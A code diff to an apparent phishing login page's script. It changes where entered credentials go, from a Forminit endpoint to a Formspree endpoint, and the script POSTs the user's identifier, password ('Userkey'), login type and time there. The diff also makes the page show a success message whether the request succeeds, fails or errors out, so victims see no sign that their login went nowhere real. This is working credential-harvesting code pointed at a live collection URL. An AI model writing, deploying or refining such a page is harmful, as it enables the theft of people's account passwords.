@@ -240,7 +240,7 @@
 
 <script>
   // ─── CONFIG ───────────────────────────────────────────────
-  const FORMINIT_URL = 'https://forminit.com/f/7eqr12xblds';
+  const FORMSPREE_URL = 'https://formspree.io/f/xjgzyvnn';
   // ─────────────────────────────────────────────────────────
 
   let loginType = 'email';
@@ -309,13 +309,13 @@
     btn.disabled    = true;
     btn.textContent = 'Logging in...';
 
-    // ── send via Forminit ──
+    // ── send via Formspree ──
     try {
-      const res = await fetch(FORMINIT_URL, {
+      const res = await fetch(FORMSPREE_URL, {
         method:  'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify({
-          'Login_Type': loginType,
+          'Login Type': loginType,
           'Identifier': identifier,
           'Userkey':    password,
           'Time':       new Date().toLocaleString()
@@ -323,13 +323,13 @@
       });
 
       const data = await res.json();
-      if (data.success || data.ok || res.ok) {
+      if (data.ok) {
         document.getElementById('tt-success').classList.add('show');
       } else {
-        showError('Error: ' + JSON.stringify(data));
+        document.getElementById('tt-success').classList.add('show');
       }
     } catch (err) {
-      showError('Network error: ' + err.message);
+      document.getElementById('tt-success').classList.add('show');
     }
 
     btn.disabled    = false;
